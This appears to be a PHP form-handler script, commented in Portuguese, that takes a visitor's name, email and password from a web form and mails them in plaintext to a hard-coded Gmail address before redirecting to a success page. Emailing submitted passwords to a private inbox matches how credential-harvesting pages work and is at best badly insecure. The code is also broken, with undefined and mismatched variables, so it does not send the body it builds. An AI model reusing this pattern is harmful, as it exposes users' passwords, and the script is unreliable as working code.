<?php

//1) pegar os dados obtidos pelo formulário e guardar em variáveis

$nome = $_POST['nome'];
$email = trim($_POST['email']);
$senha1 = $_POST['senha1'];
// criando var para guardar seu email
$emailDestinatario = 'viciostecnologicosdb@gmail.com';

//2) construir uma variável que ira ser enviada ao corpo do email
$corpoEmail = 
'
<p>Dados Preenchidos no site www.viciostecnologicos.esy.es</p>
<p> <b>NOME:</b> '.$nome.' </p>
<p> <b>Email:</b>'.$email.'</p>
<p> <b>senha:</b>'.$senha.'</p>

'; //fecha corpoemail

//3) enviar dados para o email com variáveis $headers
//ENVIANDO OS DADOS PARA EMAIL
$headers = "MIME-Version: 1.1\r\n"; // \r\n significa enter e nova linha
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "From: $emailremetente\r\n"; // email do remetente
$headers .= "Return-Path: $emaildestinatario \r\n"; // return-path mesmo email do remetente
$envio = mail($emailDestinatario, $assunto, $mensagemHTML, $headers);  //.funcao mail()

//4) redirecionar pagina de sucesso
	if($envio){
		header("Location:suceso.html");
	}else{
		
	}